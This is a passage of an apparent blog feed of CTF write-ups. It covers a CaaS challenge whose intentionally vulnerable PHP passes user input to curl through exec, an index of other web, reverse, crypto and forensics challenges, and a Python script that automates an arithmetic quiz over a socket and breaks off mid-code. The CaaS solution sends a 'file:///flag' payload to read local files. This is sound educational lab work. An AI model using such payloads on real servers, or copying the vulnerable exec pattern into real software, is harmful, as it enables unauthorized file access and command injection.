d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Now that we have executed our command, we simply go ahead and curl that flag file, and find our flag</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CHTB{p0llute_with_styl3}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Cyber Security" term="Cyber Security"/>
        <category label="CTF" term="CTF"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[CaaS - Cyberapocalypse 2021 CTF]]></title>
        <id>https://kblagoev.com/blog/caas-cyberapocalypse-2021-ctf</id>
        <link href="https://kblagoev.com/blog/caas-cyberapocalypse-2021-ctf"/>
        <updated>2021-04-30T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This is a writeup for the CaaS challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.]]></summary>
        <content type="html"><![CDATA[<p>This is a writeup for the CaaS challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="prompt">Prompt<a href="https://kblagoev.com/blog/caas-cyberapocalypse-2021-ctf#prompt" class="hash-link" aria-label="Direct link to Prompt" title="Direct link to Prompt">​</a></h3>
<p>cURL As A Service or CAAS is a brand new Alien application, built so that humans can test the status of their websites. However, it seems that the Aliens have not quite got the hang of Human programming and the application is riddled with issues.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://kblagoev.com/blog/caas-cyberapocalypse-2021-ctf#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h3>
<p>We are given the source code for a site. The site itself seems to be simply a frontend for executing <code>curl</code> on the host machine. If we so desire, we can look into the source code for more details.</p>
<p><code>index.php</code> tells us that there exists a POST endpoint <code>/api/curl</code>, which takes our host to run curl on as data.</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[REDACTED]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$router = new Router();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$router-&gt;new('GET', '/', '[email protected]');</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$router-&gt;new('POST', '/api/curl', '[email protected]' );</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[REDACTED]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We also get some information on how that works inside the  <code>controllers/CurlController.php</code> file</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class CurlController</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public function index($router)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return $router-&gt;view('index');</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public function execute($router)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $url = $_POST['ip'];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (isset($url)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $command = new CommandModel($url);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return json_encode([ 'message' =&gt; $command-&gt;exec() ]);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>and inside <code>models/CommandModel.php</code></p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class CommandModel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public function __construct($url)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $this-&gt;command = "curl -sL " . escapeshellcmd($url);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public function exec()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exec($this-&gt;command, $output);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return $output;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>All of this simply makes us certain that we have to exploit <code>curl</code>.</p>
<p>Solution The solution is quite simple, once we realise that we can curl for files inside a file system using <code>file://</code>.</p>
<p>With this in mind, we simply send <code>file:///flag</code> to our POST endpoint at <code>/api/curl</code> , and immediately get the flag</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CHTB{f1le_r3trieval_4s_a_s3rv1ce}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Cyber Security" term="Cyber Security"/>
        <category label="CTF" term="CTF"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Cyber Apocalypse 2021 Capture the Flag Write-ups]]></title>
        <id>https://kblagoev.com/blog/cyber-apocalypse-2021-capture-the-flag-write-ups</id>
        <link href="https://kblagoev.com/blog/cyber-apocalypse-2021-capture-the-flag-write-ups"/>
        <updated>2021-04-30T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[A collection of write-ups for challenges from the Cyber Apocalypse 2021 CTF finished by Kiril Blagoev.]]></summary>
        <content type="html"><![CDATA[<p>Well, here we go. This was the very first CTF event that I took part of while it was happening, and I'm quite proud of my results!</p>
<p>Most importantly, almost every challenge that I finished taught me a bunch of new concepts and techniques, and showcased what can be expected in the field of hunting vulnerabilities.</p>
<p>By the end of the 5-day ordeal I got to 357th place out of 4740 teams and more than 9500 players, and I'm very satisfied with such an outcome from my very first event of this type.</p>
<p>But, as I can now see, the learning process continues even after the event, in the form of writing write-ups! The much more level-headed approach of trying to explain and follow the process of finding the flags means that I get to see my ideas and techniques in a new light, and organise the tools and concepts much better.</p>
<p>Reading write-ups is also indisplensable, as there were quite a few other challenges that I was sure I was very near to solving, but never found out what I was missing. Reading other people's write-ups allowed me to see what I was did right or wrong, and how to improve on that.</p>
<p>So I hope you get that from reading these write-ups as well, and learn a few things from them, or at least see an another approach to solving the same problem.</p>
<p><strong>Enjoy!</strong></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="category-web">Category Web<a href="https://kblagoev.com/blog/cyber-apocalypse-2021-capture-the-flag-write-ups#category-web" class="hash-link" aria-label="Direct link to Category Web" title="Direct link to Category Web">​</a></h2>
<p><a href="https://kblagoev.com/blog/inspector-gadget-cyberapocalypse-2021-ctf">Inspector Gadget - Cyberapocalypse 2021 CTF</a></p>
<p>An easy warm-up challenge in the style of a scavenger hunt</p>
<p><a href="https://kblagoev.com/blog/caas-cyberapocalypse-2021-ctf">CaaS - Cyberapocalypse 2021 CTF</a></p>
<p>Exploiting curl running locally on the host, to get local file inclusion</p>
<p><a href="https://kblagoev.com/blog/ministrypalace-cyberapocalypse-2021-ctf">miniSTRypalace - Cyberapocalypse 2021 CTF</a></p>
<p>Showcasing the importance of white-listing instead of black-listing commands and strings inside PHP</p>
<p><a href="https://kblagoev.com/blog/blitzprop-cyberapocalypse-2021-ctf">BlitzProp - Cyberapocalypse 2021 CTF</a></p>
<p>Exploring the interesting concept ot AST injection and prototype pollution, resulting in remote code exectution. And all of that because we use the wrong version of a library in node</p>
<p><a href="https://kblagoev.com/blog/e-tree-cyberapocalypse-2021-ctf">E.Tree - Cyberapocalypse 2021 CTF</a></p>
<p>Blind XPATH injection with a slight twist</p>
<p><a href="https://kblagoev.com/blog/wild-goose-hunt-cyberapocalypse-2021-ctf">Wild goose hunt - Cyberapocalypse 2021 CTF</a></p>
<p>A challenge showcasing the weakness of improper handling of mongo queries</p>
<p><a href="https://kblagoev.com/blog/emoji-voting-cyberapocalypse-2021-ctf">Emoji Voting - Cyberapocalypse 2021 CTF</a></p>
<p>This fun challenge showcases blind SQL injection inside of an ORDER BY clause</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="category-reverse">Category Reverse<a href="https://kblagoev.com/blog/cyber-apocalypse-2021-capture-the-flag-write-ups#category-reverse" class="hash-link" aria-label="Direct link to Category Reverse" title="Direct link to Category Reverse">​</a></h2>
<p><a href="https://kblagoev.com/blog/passphrase-cyberapocalypse-2021-ctf">Passphrase - Cyberapocalypse 2021 CTF</a></p>
<p>A simple reverse-engineering challenge invoving stringcompare</p>
<p><a href="https://kblagoev.com/blog/authenticator-cyberapocalypse-2021-ctf">Authenticator - Cyberapocalypse 2021 CTF</a></p>
<p>Reverse-engineering a binary, involving both stringcompare and a bit of XOR magic</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="category-forensics">Category Forensics<a href="https://kblagoev.com/blog/cyber-apocalypse-2021-capture-the-flag-write-ups#category-forensics" class="hash-link" aria-label="Direct link to Category Forensics" title="Direct link to Category Forensics">​</a></h2>
<p><a href="https://kblagoev.com/blog/key-mission-cyberapocalypse-2021-ctf">Key Mission - Cyberapocalypse 2021 CTF</a></p>
<p>Having fun with USB Human Interface Devices, namely a keyboard. The twist was having to deal with the Shift key</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="category-crypto">Category Crypto<a href="https://kblagoev.com/blog/cyber-apocalypse-2021-capture-the-flag-write-ups#category-crypto" class="hash-link" aria-label="Direct link to Category Crypto" title="Direct link to Category Crypto">​</a></h2>
<p><a href="https://kblagoev.com/blog/nintendo-base64-cyberapocalypse-2021-ctf">Nintendo Base64 - Cyberapocalypse 2021 CTF</a></p>
<p>An easy warm-up cryptography challenge, dealing with multilayered base64 encoding and obfuscation</p>
<p><a href="https://kblagoev.com/blog/soulcrabber-cyberapocalypse-2021-ctf">Soulcrabber - Cyberapocalypse 2021 CTF</a></p>
<p>A challenge written in Rust, showcasing using known seeds for pseudo-random number generators</p>
<p><a href="https://kblagoev.com/blog/phasestream-1-cyberapocalypse-2021-ctf">Phasestream 1- Cyberapocalypse 2021 CTF</a></p>
<p>The first challenge of this series showcased XOR encryption with a 5-byte key</p>
<p><a href="https://kblagoev.com/blog/phasestream-2-cyberapocalypse-2021-ctf">Phasestream 2 - Cyberapocalypse 2021 CTF</a></p>
<p>Still on the topic of XOR, this time using a 1-byte key, but hiding the real flag in a list of 9999 different strings</p>
<p><a href="https://kblagoev.com/blog/phasestream-3-cyberapocalypse-2021-ctf">Phasestream 3 - Cyberapocalypse 2021 CTF</a></p>
<p>A challenge showcasing the devastating effects of reusing keystreams in AES encryption</p>
<p><a href="https://kblagoev.com/blog/phasestream-4-cyberapocalypse-2021-ctf">Phasestream 4 - Cyberapocalypse 2021 CTF</a></p>
<p>A direct follow-up of the previous challenge, introducing a bit of a guessing game</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="category-misc">Category Misc<a href="https://kblagoev.com/blog/cyber-apocalypse-2021-capture-the-flag-write-ups#category-misc" class="hash-link" aria-label="Direct link to Category Misc" title="Direct link to Category Misc">​</a></h2>
<p><a href="https://kblagoev.com/blog/alien-camp-cyberapocalypse-2021-ctf">Alien Camp - Cyberapocalypse 2021 CTF</a></p>
<p>A fun scripting challenge involving the automatic handling of <code>nc</code> based services</p>
<p><a href="https://kblagoev.com/blog/input-as-a-service-cyberapocalypse-2021-ctf">Input as a Service - Cyberapocalypse 2021 CTF</a></p>
<p><code>input()</code> in python2.x is scary by default</p>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Cyber Security" term="Cyber Security"/>
        <category label="CTF" term="CTF"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Alien Camp - Cyberapocalypse 2021 CTF]]></title>
        <id>https://kblagoev.com/blog/alien-camp-cyberapocalypse-2021-ctf</id>
        <link href="https://kblagoev.com/blog/alien-camp-cyberapocalypse-2021-ctf"/>
        <updated>2021-04-29T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This is a writeup for the Alien Camp challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Misc.]]></summary>
        <content type="html"><![CDATA[<p>This is a writeup for the Alien Camp challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Misc.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="prompt">Prompt<a href="https://kblagoev.com/blog/alien-camp-cyberapocalypse-2021-ctf#prompt" class="hash-link" aria-label="Direct link to Prompt" title="Direct link to Prompt">​</a></h3>
<p>The Ministry of Galactic Defense now accepts human applicants for their specialised warrior unit, in exchange for their debt to be erased. We do not want to subject our people to this training and to be used as pawns in their little games. We need you to answer 500 of their questions to pass their test and take them down from the inside.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://kblagoev.com/blog/alien-camp-cyberapocalypse-2021-ctf#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h3>
<p>We're given a box to which we can connect with <code>netcat</code>. On this machine, there's a service which has two options:</p>
<ol>
<li>Choosing option 1 will give us a list of numbers associated with emojis.</li>
<li>Choosing option 2 starts an exam, in which we need to supply the answer to 500 arithmetic problems. The only catch is, that the numbers in the equations are represented with the emojis from option 1.</li>
</ol>
<p>Additionally, every time we connect we will have a different set of emoji -&gt; number dictionary entries.</p>
<p>If we try to manually translate the emojis into numbers, and then supply the answer to an equation, we will be (likely) told that we're too slow.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution">Solution<a href="https://kblagoev.com/blog/alien-camp-cyberapocalypse-2021-ctf#solution" class="hash-link" aria-label="Direct link to Solution" title="Direct link to Solution">​</a></h3>
<p>Therefore, we need to automate the process. The solution will contain the following steps:</p>
<ol>
<li>Once connected, we will check the emoji -&gt; number relation in option 1, and record it into a dictionary.</li>
<li>We then start the exam.</li>
<li>Once supplied with an equation, we do some string manipulation to extract the emojis and arithmetic operations, and translate the emojis into numbers.</li>
<li>We evaluate the equation, and supply the answer as number.</li>
<li>We repeat step 3 and 4 500 times to get the flag.</li>
</ol>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> socket</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HOST </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'46.101.44.190'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PORT </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32223</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># a generic function to get the response as a string</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">receive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  res </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> s</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recv</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1024</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  res </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> res</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># generate an emoji -&gt; number dictionary</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">getCode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">res</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  lines </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> res</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'\n'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  arr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> lines</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">' '</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  emojis </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> arr</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  numbers </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> arr</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  dic </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">dict</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">zip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">emojis</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> numbers</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> dic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># solve the equation we're provided with</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">solveEquation</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">res</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> dic</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  lines </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> res</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'\n'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  arr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> lines</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">' '</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">arr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  values </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> arr</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  decodedValues </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" 